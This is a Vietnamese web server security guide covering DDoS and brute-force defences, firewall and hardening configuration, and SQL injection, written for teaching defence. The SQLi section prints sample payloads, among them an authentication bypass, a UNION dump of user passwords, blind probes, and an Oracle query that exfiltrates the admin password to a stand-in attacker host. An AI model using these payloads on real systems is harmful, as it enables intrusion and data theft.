# I. BẢO MẬT WEB SERVER

## 1. Phòng Chống DDoS và Brute Force

### 1.1. Tấn Công DoS và DDoS (Distributed Denial of Service)

#### 1.1.1. Tổng Quan

**Tấn công DoS là gì?**

DoS (Denial of Service - Từ chối dịch vụ) là hình thức tấn công nhằm làm quá tải máy chủ bằng cách tạo ra một lượng rất lớn các yêu cầu truy cập trong thời gian ngắn. Khi máy chủ không thể xử lý kịp thời lượng tải đột biến này, nó sẽ rơi vào trạng thái quá tải và ngừng hoạt động, khiến người dùng hợp lệ không thể tiếp cận dịch vụ.

Mục tiêu phổ biến của các cuộc tấn công DoS thường là máy chủ ảo (VPS) hoặc web server của ngân hàng, các sàn thương mại điện tử và các cổng thông tin quan trọng. Điểm yếu cố hữu của DoS là toàn bộ lưu lượng tấn công xuất phát từ một nguồn duy nhất (một địa chỉ IP hoặc một dải IP), do đó có thể bị phát hiện và ngăn chặn tương đối dễ dàng thông qua việc chặn nguồn IP đó.

**Tấn công DDoS là gì?**

DDoS (Distributed Denial of Service - Từ chối dịch vụ phân tán) là hình thức tấn công tiên tiến hơn, trong đó kẻ tấn công sử dụng nhiều nguồn lưu lượng phân tán để áp đảo máy chủ mục tiêu. Những nguồn lưu lượng này thường là một mạng "botnet" gồm hàng nghìn đến hàng triệu máy tính, camera an ninh hoặc thiết bị IoT đã bị nhiễm mã độc và bị hacker kiểm soát từ xa.

Hậu quả là máy chủ bị cạn kiệt tài nguyên (CPU, RAM, băng thông mạng) và không thể phục vụ người dùng hợp lệ. Vì lưu lượng tấn công đến từ hàng nghìn địa chỉ IP khác nhau, việc phân biệt traffic độc hại với traffic hợp lệ trở nên vô cùng khó khăn.

#### 1.1.2. Động Cơ và Mục Đích Tấn Công

Các cuộc tấn công DDoS được thực hiện vì nhiều mục đích khác nhau:

- **Tài chính:** Tấn công DDoS thường được kết hợp với ransomware, nơi kẻ tấn công vừa làm tê liệt hệ thống vừa tống tiền nạn nhân. Ngoài ra, các doanh nghiệp đối thủ đôi khi cũng thuê dịch vụ DDoS để triệt hạ đối thủ cạnh tranh và giành lợi thế thị trường.
- **Bất đồng về ý thức hệ:** Các cuộc tấn công thường nhắm vào cơ quan quản lý nhà nước, tổ chức chính trị hoặc các nhóm có quan điểm đối lập, nhằm mục đích phản đối hoặc hỗ trợ cho một hệ tư tưởng chính trị hay tôn giáo cụ thể.
- **Chiến thuật:** Trong nhiều trường hợp, DDoS chỉ là một phần của chiến dịch tấn công quy mô lớn hơn, thường được kết hợp với tấn công vật lý hoặc tấn công phần mềm nhằm tạo ra sự phân tâm để thực hiện các mục tiêu khác.
- **Thương mại:** Tấn công DDoS có thể được sử dụng để gây thiệt hại kinh tế hoặc đánh cắp thông tin từ các ngành công nghiệp cụ thể. Các vụ tấn công nhắm vào Sony, British Airways là ví dụ điển hình, gây mất niềm tin của người tiêu dùng vào cả một ngành.
- **Tống tiền:** Kẻ tấn công có thể đe dọa thực hiện hoặc duy trì tấn công DDoS trừ khi nạn nhân trả tiền chuộc, dù không nhất thiết phải kết hợp với ransomware.
- **Tấn công do nhà nước bảo trợ:** Một số cuộc tấn công DDoS quy mô lớn được tiến hành bởi các tổ chức được nhà nước hỗ trợ, nhằm mục đích gây rối loạn cơ sở hạ tầng quân sự hoặc dân sự của quốc gia đối thủ.

#### 1.1.3. Cấu Hình Phòng Chống trên Web Server (Nginx)

Cần lưu ý rằng phòng thủ DDoS một cách triệt để chỉ bằng web server là điều rất khó thực hiện nếu lưu lượng tấn công quá lớn, vì máy chủ sẽ bị nghẽn ở tầng mạng trước khi web server kịp xử lý. Tuy nhiên, cấu hình web server hợp lý sẽ giúp chống lại các đợt DDoS quy mô nhỏ hoặc tấn công ở tầng ứng dụng (Layer 7), điển hình là HTTP Flood và Slowloris.

**a. Giới hạn tốc độ yêu cầu (Rate Limiting)**

Cơ chế này ngăn một địa chỉ IP gửi quá nhiều yêu cầu trong một khoảng thời gian nhất định.

Mở file cấu hình chính `/etc/nginx/nginx.conf` và thêm các chỉ thị sau:

```nginx
# Khai báo zone giới hạn trong context 'http'
limit_req_zone $binary_remote_addr zone=mylimit:10m rate=10r/s;

# Áp dụng zone trong context 'server' hoặc 'location'
limit_req zone=mylimit burst=20 nodelay;
```

**b. Giới hạn số lượng kết nối đồng thời (Connection Limiting)**

Chỉ thị này giới hạn số kết nối đồng thời từ một địa chỉ IP duy nhất, ngăn chặn việc một IP chiếm dụng toàn bộ tài nguyên kết nối của máy chủ.

```nginx
# Khai báo zone trong context 'http'
limit_conn_zone $binary_remote_addr zone=addr:10m;

# Áp dụng giới hạn trong context 'server'
limit_conn addr 10;
```

**c. Giảm Timeout kết nối**

Cấu hình này nhằm chống lại kiểu tấn công Slowloris, trong đó kẻ tấn công cố tình mở kết nối và gửi dữ liệu cực kỳ chậm để giữ kết nối ở trạng thái mở vô thời hạn, làm cạn kiệt giới hạn kết nối của máy chủ.

Thêm các chỉ thị sau vào trong khối `server {}`:

```nginx
client_body_timeout   10s;
client_header_timeout 10s;
keepalive_timeout     5s 5s;
send_timeout          10s;
```

Sau khi chỉnh sửa, khởi động lại Nginx để áp dụng cấu hình:

```bash
sudo systemctl restart nginx
```

**d. Sử dụng WAF và Reverse Proxy**

Trong thực tế, đối với các hệ thống có quy mô lớn, giải pháp phòng thủ hiệu quả nhất là đưa hệ thống ra sau một dịch vụ bảo vệ chuyên dụng như Cloudflare hoặc AWS Shield. Các dịch vụ này sẽ hấp thụ và lọc lưu lượng DDoS tại các trung tâm dữ liệu phân tán trên toàn cầu trước khi các yêu cầu hợp lệ được chuyển tiếp đến web server thực sự.

#### 1.1.4. Tối Ưu Tầng Hệ Điều Hành (Linux Kernel)

Web server chỉ xử lý được đến Tầng 7 (Application Layer). Để bảo vệ hệ thống trước các cuộc tấn công cạn kiệt tài nguyên mạng ở tầng thấp hơn (điển hình là SYN Flood ở Tầng 4 - Transport Layer), cần cấu hình thêm ở tầng nhân Linux.

Mở file `/etc/sysctl.conf`:

```bash
sudo nano /etc/sysctl.conf
```

Thêm hoặc chỉnh sửa các tham số sau ở cuối file:

```ini
# Bật TCP SYN Cookies để chặn tấn công SYN Flood
net.ipv4.tcp_syncookies = 1

# Giảm thời gian lưu giữ kết nối đang trong quá trình đóng
net.ipv4.tcp_fin_timeout = 15

# Cho phép tái sử dụng các socket ở trạng thái TIME-WAIT nhanh hơn
net.ipv4.tcp_tw_reuse = 1

# Tăng giới hạn kích thước hàng đợi kết nối chờ xử lý (Backlog)
net.core.somaxconn = 65535
net.ipv4.tcp_max_syn_backlog = 65535
```

Áp dụng các thay đổi ngay lập tức mà không cần khởi động lại hệ thống:

```bash
sudo sysctl -p
```

### 1.2. Tấn Công Brute Force

#### 1.2.1. Tổng Quan

Brute Force (Tấn công vét cạn) là hình thức tấn công theo phương pháp "thử và sai" có hệ thống. Kẻ tấn công sử dụng phần mềm tự động để thử hàng nghìn, thậm chí hàng triệu tổ hợp tên đăng nhập và mật khẩu khác nhau một cách liên tục cho đến khi tìm được thông tin đúng để xâm nhập vào hệ thống.

Mục tiêu thường gặp của các cuộc tấn công này bao gồm trang đăng nhập quản trị (như `/wp-login.php` của WordPress), cổng SSH, hoặc các API endpoint xác thực. Các cuộc tấn công được tự động hóa bằng cách sử dụng danh sách từ điển (wordlist) chứa các tổ hợp tên người dùng và mật khẩu phổ biến, kết hợp với các công cụ chuyên dụng có khả năng thực hiện đăng nhập tự động với tốc độ rất cao.

Cần lưu ý thêm rằng nếu Brute Force được thực hiện với tần suất đủ cao, nó cũng có thể gây ra hiệu ứng tương tự tấn công DoS, làm cho máy chủ không đủ tài nguyên để xử lý các yêu cầu hợp lệ khác.

#### 1.2.2. Mục Đích và Hậu Quả

Việc đánh cắp mật khẩu người dùng luôn đi kèm với những hậu quả nghiêm trọng. Ở mức độ cơ bản nhất, nạn nhân bị lộ thông tin đăng nhập và toàn bộ dữ liệu trong tài khoản đó. Mức độ thiệt hại sẽ phụ thuộc vào tầm quan trọng của tài khoản bị xâm phạm. Nếu tài khoản bị tấn công là tài khoản quản trị viên của một tổ chức, toàn bộ cơ sở dữ liệu nhạy cảm của tổ chức đó có thể bị lộ, dẫn đến vi phạm dữ liệu ở cấp độ doanh nghiệp.

#### 1.2.3. Các Công Cụ Tấn Công Phổ Biến

- **Aircrack-ng:** Bộ công cụ đánh giá an ninh mạng Wi-Fi, hỗ trợ giám sát, xuất dữ liệu và tấn công thông qua các phương pháp như điểm truy cập giả mạo và chèn gói tin.
- **John the Ripper:** Công cụ khôi phục mật khẩu mã nguồn mở hỗ trợ hàng trăm loại thuật toán mã hóa và băm, bao gồm mật khẩu hệ điều hành macOS, Unix, Windows, máy chủ cơ sở dữ liệu và ứng dụng web.
- **Hydra:** Nền tảng tấn công mạng mã nguồn mở được cộng đồng bảo mật liên tục phát triển thêm module mới. Hydra hỗ trợ hơn 50 giao thức và có thể chạy trên nhiều hệ điều hành khác nhau.
- **L0phtCrack:** Công cụ bẻ khóa mật khẩu Windows, sử dụng kết hợp kỹ thuật Rainbow Table, tấn công từ điển và thuật toán đa xử lý.
- **Burp Suite:** Mặc dù không phải công cụ chuyên dụng cho Brute Force, Burp Suite cho phép cấu hình linh hoạt để thực hiện tấn công vét cạn tùy chỉnh thông qua tính năng Intruder.

#### 1.2.4. Cấu Hình Phòng Chống

Khác với DDoS nhắm vào việc làm cạn kiệt tài nguyên mạng, Brute Force tấn công trực tiếp vào **tầng logic ứng dụng** (Application Layer), cụ thể là các form đăng nhập, API endpoint xác thực hoặc cổng SSH. Mục tiêu là dò tìm mật khẩu. Vì vậy, phòng chống cần được triển khai theo nhiều lớp.

**Lớp 1: Cấu Hình Nginx / Apache**

Web server có thể giảm nhịp độ tấn công dò mật khẩu bằng cách giới hạn khắt khe tốc độ truy cập vào các đường dẫn nhạy cảm.

**Trên Nginx: Giới hạn tốc độ riêng cho trang đăng nhập**

Thay vì áp dụng giới hạn chung cho toàn bộ website, nên tạo một zone riêng cực kỳ nghiêm ngặt chỉ dành cho URL đăng nhập:

```nginx
http {
    # Tạo zone riêng cho trang login, giới hạn 30 request mỗi phút
    limit_req_zone $binary_remote_addr zone=login_limit:10m rate=30r/m;
}

server {
    # Áp dụng cho các route đăng nhập phổ biến
    location ~* /(login|admin/login|api/auth) {
        # Cho phép xếp hàng tối đa 5 request, vượt quá trả về lỗi 503 ngay lập tức
        limit_req zone=login_limit burst=5 nodelay;

        # Chuyển tiếp request vào ứng dụng backend
        proxy_pass http://127.0.0.1:8000;
    }
}
```

**Thêm lớp HTTP Basic Authentication**

Đối với các trang quản trị nội bộ không dành cho người dùng bên ngoài, nên bổ sung thêm lớp xác thực tại tầng web server. Kẻ tấn công sẽ phải vượt qua lớp mật khẩu này của Nginx/Apache trước khi tiếp cận giao diện ứng dụng.

Tạo file lưu mật khẩu (yêu cầu gói `apache2-utils`):

```bash
sudo htpasswd -c /etc/nginx/.htpasswd admin_user
```

Cấu hình trên Nginx:

```nginx
location /admin-portal/ {
    auth_basic "Khu vuc quan tri noi bo";
    auth_basic_user_file /etc/nginx/.htpasswd;
}
```

Cấu hình tương đương trên Apache:

```apache
<Directory "/var/www/html/admin-portal">
    AuthType Basic
    AuthName "Khu vuc quan tri noi bo"
    AuthUserFile /etc/apache2/.htpasswd
    Require valid-user
</Directory>
```

**Lớp 2: Fail2Ban - Tường Lửa Động**

Chỉ sử dụng web server là chưa đủ. Nếu kẻ tấn công điều chỉnh tốc độ tấn công xuống dưới ngưỡng Rate Limit (ví dụ: thử 1 mật khẩu mỗi 3 giây), web server sẽ không thể phát hiện. **Fail2Ban** là công cụ tiêu chuẩn trong quản trị hệ thống Linux để xử lý trường hợp này.

Fail2Ban liên tục phân tích file log của Nginx/Apache. Khi phát hiện bất kỳ địa chỉ IP nào sinh ra quá nhiều lỗi `401 Unauthorized` (sai thông tin đăng nhập) hoặc `403 Forbidden`, nó sẽ tự động cập nhật quy tắc tường lửa (iptables/UFW) để chặn địa chỉ IP đó ở tầng mạng trong khoảng thời gian được cấu hình.

**Bước 1: Cài đặt**

```bash
sudo apt update
sudo apt install fail2ban
```

**Bước 2: Tạo file cấu hình riêng**

Không chỉnh sửa trực tiếp file gốc `jail.conf` để tránh bị ghi đè khi cập nhật. Thay vào đó, tạo một bản sao cục bộ:

```bash
sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
sudo nano /etc/fail2ban/jail.local
```

**Bước 3: Kích hoạt các bộ lọc cho Nginx**

Trong file `jail.local`, tìm và chỉnh sửa các section sau:

```ini
[nginx-http-auth]
# Bắt lỗi đăng nhập sai (Basic Auth thất bại)
enabled  = true
port     = http,https
logpath  = /var/log/nginx/error.log
findtime = 600
maxretry = 3
bantime  = 3600   # Khóa 1 giờ nếu sai 3 lần trong 10 phút

[nginx-botsearch]
# Chặn các bot dò quét đường dẫn mặc định như /wp-admin, /phpmyadmin
enabled  = true
port     = http,https
logpath  = /var/log/nginx/access.log
maxretry = 2
bantime  = 86400  # Khóa 24 giờ
```

**Lớp 3: Giới Hạn IP tại Tầng Mạng (IP Whitelisting)**

Đây là phương pháp phòng chống **tuyệt đối nhất**, nhưng chỉ áp dụng được khi hệ thống hoặc API chỉ phục vụ một tập hợp người dùng có địa chỉ IP cố định, xác định trước (ví dụ: hệ thống quản lý nội bộ chỉ dành cho nhân viên trong văn phòng).

Cấu hình trên Nginx:

```nginx
location /system-admin/ {
    allow 192.168.1.0/24;  # Cho phép dải IP mạng LAN nội bộ
    deny all;              # Chặn tất cả các địa chỉ IP còn lại
}
```

**Lớp 4: Tầng Ứng Dụng (Application Layer)**

Nếu kẻ tấn công sở hữu một mạng botnet quy mô lớn, chúng có thể luân chuyển địa chỉ IP liên tục (mỗi IP chỉ thử một mật khẩu). Trong trường hợp này, web server và Fail2Ban hoàn toàn "mù" vì mỗi IP không vi phạm ngưỡng được cấu hình. Vì vậy, lớp phòng thủ cuối cùng và bắt buộc phải được xây dựng trong code ứng dụng backend:

1. **Account Lockout (Khóa tài khoản):** Sau một số lần nhập sai mật khẩu nhất định (ví dụ: 5 lần) từ bất kỳ địa chỉ IP nào, tự động khóa tài khoản đó trong một khoảng thời gian (ví dụ: 15 phút) và yêu cầu xác nhận qua email để mở khóa.
2. **CAPTCHA / reCAPTCHA:** Kích hoạt sau 2-3 lần đăng nhập thất bại để ngăn chặn các công cụ tự động không thể xử lý được thử thách nhận dạng hình ảnh.
3. **Thông báo lỗi chung chung:** Khi đăng nhập thất bại, luôn trả về thông báo: *"Tên đăng nhập hoặc mật khẩu không đúng."* Tuyệt đối không trả về thông báo cụ thể như *"Tài khoản không tồn tại"* vì kẻ tấn công sẽ dùng thông tin đó để lọc ra danh sách username hợp lệ trước khi tiến hành brute force mật khẩu.

## 2. Cấu Hình Firewall (Tường Lửa)

### 2.1. IPtables

IPtables là ứng dụng tường lửa mã nguồn mở trên Linux, cho phép thiết lập các quy tắc để kiểm soát luồng lưu lượng mạng và tăng cường bảo mật. Về bản chất, IPtables chỉ là giao diện dòng lệnh để tương tác với cơ chế packet filtering của netfilter framework trong nhân Linux. Cơ chế này hoạt động dựa trên ba thành phần chính: Tables (bảng quy tắc), Chains (chuỗi xử lý) và Targets (hành động thực thi).

#### Cài Đặt IPtables

Hầu hết các bản phân phối Linux hiện nay đều tích hợp sẵn IPtables. Nếu chưa có, có thể cài đặt trên Ubuntu/Debian bằng lệnh:

```bash
sudo apt-get update
sudo apt-get install iptables
```

Kiểm tra danh sách các quy tắc hiện tại:

```bash
sudo iptables -L -v
```

Cú pháp tổng quát để thêm một quy tắc:

```bash
sudo iptables -A <chain> -i <interface> -p <protocol> -s <source_ip> --dport <port> -j <target>
```

#### Cấu Hình Cơ Bản IPtables

Dưới đây là quy trình cấu hình tường lửa từ đầu theo thứ tự được khuyến nghị. Thứ tự các bước rất quan trọng để tránh tự khóa mình khỏi máy chủ.

**Bước 1: Xóa cấu hình cũ**

```bash
iptables -F
iptables -X
```

Lệnh `-F` (Flush) xóa toàn bộ các quy tắc hiện có trong tất cả các chain. Lệnh `-X` xóa các chain tùy chỉnh do người dùng tạo. Bước này giúp dọn sạch cấu hình để bắt đầu lại từ đầu, tránh xung đột với các quy tắc cũ.

**Bước 2: Duy trì các kết nối hiện đang hoạt động**

```bash
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
```

Chỉ thị `--ctstate ESTABLISHED,RELATED` cho phép các gói tin thuộc về phiên kết nối đang hoạt động đi qua mà không bị kiểm tra lại. Đây là bước cực kỳ quan trọng để giữ nguyên phiên SSH hiện tại của quản trị viên, tránh bị ngắt kết nối giữa chừng khi đang cấu hình.

**Bước 3: Cho phép lưu lượng nội bộ (Loopback)**

```bash
iptables -A INPUT -i lo -j ACCEPT
```

Lệnh `-i lo` cho phép luồng dữ liệu đi qua giao diện mạng nội bộ (loopback - địa chỉ 127.0.0.1). Điều này bắt buộc phải có để các dịch vụ trên cùng một máy chủ có thể giao tiếp với nhau (ví dụ: Nginx kết nối với MySQL qua localhost).

**Bước 4: Mở cổng SSH**

```bash
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
```

Cho phép giao thức TCP đi vào cổng 22 để quản trị viên có thể quản lý máy chủ từ xa qua SSH. Nếu hệ thống sử dụng cổng SSH khác (thực hành bảo mật tốt là đổi cổng SSH khỏi cổng mặc định 22), hãy thay số 22 tương ứng.

**Bước 5: Mở cổng Web Server**

```bash
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT
```

Cho phép kết nối TCP từ bên ngoài vào cổng 80 (HTTP) và cổng 443 (HTTPS) để người dùng có thể truy cập website.

**Bước 6: Chặn các gói tin dị dạng**

```bash
iptables -A INPUT -m conntrack --ctstate INVALID -j DROP
```

Module conntrack với trạng thái `INVALID` phát hiện các gói tin bị lỗi, dị dạng hoặc không tuân theo chuẩn giao thức. Lệnh `-j DROP` lập tức loại bỏ các gói tin này, phòng ngừa kẻ tấn công sử dụng chúng để thực hiện port scan hoặc khai thác các lỗ hổng xử lý gói tin.

**Bước 7: Giới hạn ICMP (Chống Ping Flood)**

```bash
iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT
iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
```

Lệnh đầu tiên sử dụng module `limit` chỉ cho phép tối đa 1 gói tin ICMP echo-request (ping) đi qua tường lửa mỗi giây. Lệnh thứ hai loại bỏ tất cả các gói ping vượt quá giới hạn đó. Cặp quy tắc này bảo vệ hệ thống khỏi kiểu tấn công gửi hàng triệu lệnh ping cùng lúc để làm quá tải.

**Bước 8: Chống DDoS cơ bản**

```bash
iptables -A INPUT -p tcp --syn --dport 80  -m connlimit --connlimit-above 50 -j REJECT --reject-with tcp-reset
iptables -A INPUT -p tcp --syn --dport 443 -m connlimit --connlimit-above 50 -j REJECT --reject-with tcp-reset
```

Module `connlimit` phát hiện nếu một địa chỉ IP cố gắng thiết lập hơn 50 kết nối mới đồng thời vào máy chủ. Khi vượt ngưỡng, `-j REJECT --reject-with tcp-reset` chủ động từ chối và đóng kết nối đó, ngăn chặn kẻ tấn công làm cạn kiệt tài nguyên RAM và CPU của máy chủ.

**Bước 9: Thiết lập chính sách mặc định**

```bash
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT
```

Lệnh `-P` (Policy) thiết lập hành động mặc định cho mỗi chain. Sau khi đã đối chiếu qua tất cả các quy tắc từ bước 1 đến 8, nếu một gói tin đến không khớp với bất kỳ quy tắc nào, nó sẽ tự động bị DROP (chặn). Chiều ra (OUTPUT) được giữ ở trạng thái ACCEPT để máy chủ có thể gửi phản hồi và kết nối internet bình thường.

## 3. Hardening Server (Tăng Cường Bảo Mật Máy Chủ)

Việc hardening (làm cứng) máy chủ web Linux là bước không thể thiếu sau khi cài đặt, nhằm giảm thiểu bề mặt tấn công và bảo vệ dữ liệu. Mục tiêu là đưa máy chủ từ trạng thái mặc định sang trạng thái được cấu hình chặt chẽ, loại bỏ các điểm yếu không cần thiết.

### 3.1. Cập Nhật Hệ Thống và Quản Lý Người Dùng

Trước khi triển khai bất kỳ cấu hình nào khác, cần đảm bảo nền tảng hệ thống luôn được cập nhật và quyền truy cập được kiểm soát chặt chẽ.

- **Cập nhật hệ thống:** Đảm bảo tất cả các gói phần mềm được vá các lỗ hổng bảo mật đã biết.
  ```bash
  sudo apt update && sudo apt upgrade -y
  ```
- **Vô hiệu hóa đăng nhập trực tiếp bằng tài khoản root:** Tài khoản `root` là mục tiêu ưu tiên của kẻ tấn công vì nó có toàn quyền trên hệ thống. Thay vào đó, hãy sử dụng một tài khoản người dùng thường có quyền `sudo`. Chỉnh sửa `/etc/ssh/sshd_config` và đặt:
  ```
  PermitRootLogin no
  ```
- **Sử dụng SSH Key thay vì mật khẩu:** Thay thế xác thực bằng mật khẩu bằng SSH Key (RSA 4096-bit hoặc Ed25519) để loại bỏ hoàn toàn nguy cơ tấn công Brute Force vào cổng SSH. SSH Key không thể bị đoán ra bằng phương pháp vét cạn.

### 3.2. Tắt Các Dịch Vụ Không Cần Thiết

Mỗi dịch vụ đang chạy là một cánh cửa tiềm năng để kẻ tấn công khai thác. Nguyên tắc bảo mật là: càng ít dịch vụ đang chạy, bề mặt tấn công càng nhỏ.

Kiểm tra các dịch vụ đang lắng nghe trên các cổng mạng:

```bash
sudo netstat -tulpn
# hoặc
sudo ss -tulpn
```

<img width="1402" height="768" alt="image" src="https://github.com/user-attachments/assets/451366a5-f666-4b50-8325-1e893045c1e2" />

Các dịch vụ thường không cần thiết trên web server:

- **Dịch vụ kết nối từ xa cũ (Legacy services):** `rsh`, `rlogin`, `telnet`, `ftp` - những giao thức này truyền dữ liệu dưới dạng văn bản thuần không mã hóa, rất dễ bị nghe lén. Thay thế bằng SFTP hoặc SCP qua SSH.
- **Dịch vụ in ấn:** `cups` - không cần thiết trên web server.
- **Dịch vụ phát hiện thiết bị mạng:** `avahi-daemon` - dịch vụ mDNS/DNS-SD thường không cần thiết trên server.

Cách tắt và ngăn khởi động cùng hệ thống:

```bash
sudo systemctl stop <tên_dịch_vụ>
sudo systemctl disable <tên_dịch_vụ>
```

### 3.3. Cấu Hình Tường Lửa

Chỉ mở các cổng thực sự cần thiết. Đối với web server thông thường, chỉ cần mở ba cổng sau:

- **80** (HTTP)
- **443** (HTTPS)
- **Cổng SSH tùy chỉnh** (Nên đổi từ cổng 22 mặc định sang một cổng khác để giảm lưu lượng quét tự động, ví dụ: 2222)

Sử dụng UFW (Uncomplicated Firewall) trên Ubuntu:

```bash
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 443/tcp
sudo ufw allow 80/tcp
sudo ufw allow <cong_ssh_tuy_chinh>/tcp
sudo ufw enable
```

### 3.4. Bảo Mật Web Server (Nginx/Apache)

Sau khi web server đã được cài đặt và chạy, cần cấu hình để nó không tiết lộ thông tin nhạy cảm cho kẻ tấn công.

- **Ẩn phiên bản phần mềm:** Thông tin về phiên bản Nginx/Apache cho phép kẻ tấn công tra cứu các lỗ hổng đã biết của phiên bản đó.
  - **Nginx:** Thêm `server_tokens off;` vào `nginx.conf`.
  - **Apache:** Trong `security.conf`, đặt `ServerTokens Prod` và `ServerSignature Off`.
- **Cài đặt chứng chỉ SSL/TLS:** Sử dụng Let's Encrypt (Certbot) để mã hóa toàn bộ lưu lượng giữa máy chủ và người dùng, bảo vệ dữ liệu khỏi bị nghe lén.
- **Cấu hình HTTP Security Headers:** Thêm các header bảo mật để chống lại các cuộc tấn công phổ biến:
  - `X-Frame-Options: DENY` - Chống Clickjacking.
  - `X-Content-Type-Options: nosniff` - Chống MIME-type sniffing.
  - `Content-Security-Policy` - Kiểm soát nguồn tài nguyên được phép tải, chống XSS.

### 3.5. Cài Đặt Công Cụ Giám Sát và Chống Xâm Nhập

- **Fail2Ban:** Tự động phát hiện và chặn các địa chỉ IP có hành vi dò mật khẩu quá nhiều lần (đã đề cập chi tiết ở phần 1.2.4).
- **ModSecurity:** Web Application Firewall (WAF) mã nguồn mở tích hợp vào Nginx/Apache, có khả năng phát hiện và chặn các cuộc tấn công SQL Injection, XSS và nhiều kỹ thuật tấn công ứng dụng web khác ngay ở tầng web server.
- **AIDE (Advanced Intrusion Detection Environment):** Công cụ kiểm tra tính toàn vẹn của file hệ thống. AIDE tạo ra một cơ sở dữ liệu checksum của tất cả các file quan trọng khi hệ thống còn sạch, sau đó định kỳ so sánh trạng thái hiện tại để phát hiện bất kỳ thay đổi trái phép nào.

### 3.6. Phân Vùng và Quản Lý Quyền Hạn File

- **Phân vùng riêng biệt:** Nếu điều kiện hạ tầng cho phép, nên tách `/var/log`, `/tmp` và `/home` ra các phân vùng đĩa riêng biệt. Điều này ngăn tình trạng log đầy đĩa làm tê liệt toàn bộ hệ thống - một dạng tấn công DoS từ bên trong.
- **Quản lý quyền sở hữu file:** Các file web (`/var/www/html`) phải thuộc sở hữu của user phù hợp (thường là `www-data` hoặc `nginx`) và không được cấp quyền ghi (`write`) quá mức cần thiết. Kẻ tấn công có quyền ghi trên thư mục web có thể tải lên và thực thi webshell.

> **Lưu ý quan trọng:** Luôn sao lưu các file cấu hình trước khi chỉnh sửa. Một thay đổi sai cú pháp trong file cấu hình SSH có thể khiến quản trị viên bị khóa hoàn toàn khỏi máy chủ.

## 4. Xử Lý Các Lỗ Hổng Bảo Mật Ứng Dụng Web

### 4.1. SQL Injection (SQLi)

#### 4.1.1. Tổng Quan

SQL Injection là kỹ thuật tấn công trong đó kẻ tấn công chèn mã SQL độc hại vào các truy vấn SQL mà ứng dụng thực hiện. Lỗ hổng này phát sinh khi ứng dụng ghép nối trực tiếp dữ liệu đầu vào của người dùng vào câu lệnh SQL mà không qua bất kỳ bước xử lý hay kiểm tra nào.

Ví dụ minh họa về câu lệnh dễ bị tấn công:

```sql
-- Câu lệnh ban đầu
SELECT * FROM users WHERE username = 'admin' AND password = 'password123';

-- Sau khi kẻ tấn công chèn vào trường username: admin' --
SELECT * FROM users WHERE username = 'admin' --' AND password = 'password123';
```

Trong ví dụ trên, ký tự `--` là ký hiệu bắt đầu comment trong SQL. Phần còn lại của câu lệnh (bao gồm điều kiện kiểm tra mật khẩu) bị vô hiệu hóa hoàn toàn, cho phép kẻ tấn công đăng nhập vào tài khoản `admin` mà không cần biết mật khẩu.

#### 4.1.2. Các Dạng Tấn Công SQL Injection

**a. In-band SQLi (SQL Injection trực tiếp)**

Đây là dạng tấn công trực diện nhất, kẻ tấn công nhận kết quả ngay lập tức thông qua phản hồi của trang web.

- **Error-based SQLi:** Kẻ tấn công cố tình gây lỗi để ép database hiển thị thông tin về cấu trúc bảng và database thông qua thông báo lỗi. Ví dụ: nhập ký tự `'` vào ô tìm kiếm. Nếu server trả về thông báo lỗi SQL chi tiết như `SQL syntax error near '''' at line 1`, kẻ tấn công biết ứng dụng đang nối chuỗi trực tiếp và bắt đầu khai thác.

- **Union-based SQLi:** Kẻ tấn công sử dụng toán tử `UNION` để ghép kết quả từ bảng khác vào kết quả hiển thị của ứng dụng. Câu lệnh gốc `SELECT name, description FROM products WHERE id = [ID]` có thể bị biến thành:
  ```sql
  SELECT name, description FROM products WHERE id = 1
  UNION SELECT username, password FROM users
  ```
  Kết quả: trang web thay vì hiển thị thông tin sản phẩm sẽ hiển thị danh sách tài khoản và mật khẩu.

**b. Inferential SQLi (Blind SQL Injection)**

Dạng này nguy hiểm hơn vì kẻ tấn công không thấy dữ liệu trả về trực tiếp, mà phải suy luận thông tin từ phản ứng gián tiếp của server.

- **Boolean-based:** Kẻ tấn công gửi các câu lệnh SQL với điều kiện Đúng/Sai, sau đó quan sát xem trang web có hiển thị nội dung hay không để suy luận từng ký tự của dữ liệu cần lấy.
  ```sql
  -- Nếu trang web hiển thị bình thường → ký tự đầu tiên của password admin là 'a'
  1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'
  ```

- **Time-based:** Kẻ tấn công xác định thông tin bằng cách đo thời gian phản hồi. Nếu điều kiện đúng, câu lệnh `WAITFOR DELAY` sẽ làm server chờ một khoảng thời gian xác định trước khi phản hồi.
  ```sql
  1; IF (SELECT user() = 'sa') WAITFOR DELAY '0:0:10'
  ```
  Nếu trình duyệt chờ đúng 10 giây, kẻ tấn công biết database đang chạy với quyền System Admin (`sa`).

**c. Out-of-band SQLi**

Kỹ thuật nâng cao, dùng khi các kênh phản hồi thông thường bị chặn. Kẻ tấn công điều khiển database tự thực hiện kết nối ra ngoài để gửi dữ liệu đến server do chúng kiểm soát.

```sql
-- Ví dụ trên Oracle: database tự gửi mật khẩu admin qua HTTP request
SELECT utl_http.request('http://hacker-server.com/'||(SELECT pass FROM users WHERE user='admin')) FROM dual;
```

#### 4.1.3. Hậu Quả

SQL Injection được xếp vào nhóm lỗ hổng nguy hiểm nhất vì nó tấn công trực tiếp vào tầng dữ liệu của hệ thống:

- **Rò rỉ dữ liệu nhạy cảm:** Toàn bộ danh sách người dùng, mật khẩu, thông tin thẻ tín dụng có thể bị trích xuất, dẫn đến vi phạm quyền riêng tư và các chế tài pháp lý như GDPR.
- **Phá hủy tính toàn vẹn dữ liệu:** Kẻ tấn công có thể thực hiện các lệnh `UPDATE` hoặc `DELETE` để thay đổi số dư tài khoản, xóa lịch sử giao dịch hoặc bôi nhọ thông tin trên website.
- **Chiếm quyền điều khiển máy chủ (RCE):** Trong một số cấu hình yếu (đặc biệt với SQL Server), kẻ tấn công có thể dùng các hàm hệ thống như `xp_cmdshell` để thực thi lệnh trực tiếp trên hệ điều hành, từ đó cài mã độc hoặc tấn công leo thang vào mạng nội bộ.
